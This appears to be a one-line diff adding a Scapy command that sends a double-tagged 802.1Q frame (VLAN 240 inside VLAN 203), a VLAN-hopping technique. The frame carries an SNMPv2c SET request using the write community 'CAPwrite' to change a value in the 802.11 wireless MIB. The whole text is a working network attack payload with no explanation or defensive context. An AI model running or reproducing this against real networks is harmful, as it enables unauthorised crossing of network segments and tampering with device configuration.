@@ -1,0 +1,1 @@
+sendp(Ether()/Dot1Q(vlan=240)/Dot1Q(vlan=203)/IP(dst="8.8.8.8")/UDP(sport=1055,dport=161)/SNMP(community='CAPwrite',version='v2c',PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.2.840.10036.4.3.1.10.2"),value=8)])))
